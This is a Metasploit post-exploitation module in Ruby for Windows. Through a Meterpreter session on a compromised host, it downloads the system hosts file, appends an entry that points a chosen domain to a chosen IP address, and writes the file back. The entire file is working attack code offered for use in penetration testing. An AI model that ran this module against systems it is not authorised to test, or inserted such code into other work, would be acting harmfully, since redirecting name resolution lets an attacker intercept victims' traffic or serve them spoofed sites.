##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Post

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Manage Hosts File Injection',
      'Description'   => %q{
        This module allows the attacker to insert a new entry into the target
        system's hosts file.
      },
      'License'       => BSD_LICENSE,
      'Author'        => [ 'vt <nick.freeman[at]security-assessment.com>'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('DOMAIN', [ true, 'Domain name for host file manipulation.' ]),
        OptString.new('IP', [ true, 'IP address to point domain name to.' ])
      ], self.class)
  end


  def run
    if datastore['IP'].nil? or datastore['DOMAIN'].nil?
      print_error("Please specify both DOMAIN and IP")
      return
    end

    ip       = datastore['IP']
    hostname = datastore['DOMAIN']

    # Get a temporary file path
    meterp_temp = Tempfile.new('meterp')
    meterp_temp.binmode
    temp_path = meterp_temp.path

    begin
      # Download the remote file to the temporary file
      client.fs.file.download_file(temp_path, 'C:\\WINDOWS\\System32\\drivers\\etc\\hosts')
    rescue RequestError => re
      # If the file doesn't exist, then it's okay.  Otherwise, throw the
      # error.
      if re.result != 2
        raise $!
      end
    end

    print_status("Inserting hosts file entry pointing #{hostname} to #{ip}..")
    hostsfile = ::File.open(temp_path, 'ab')
    hostsfile.write("\r\n#{ip}\t#{hostname}")
    hostsfile.close()

    client.fs.file.upload_file('C:\\WINDOWS\\System32\\drivers\\etc\\hosts', temp_path)
    print_good("Done!")
  end
end
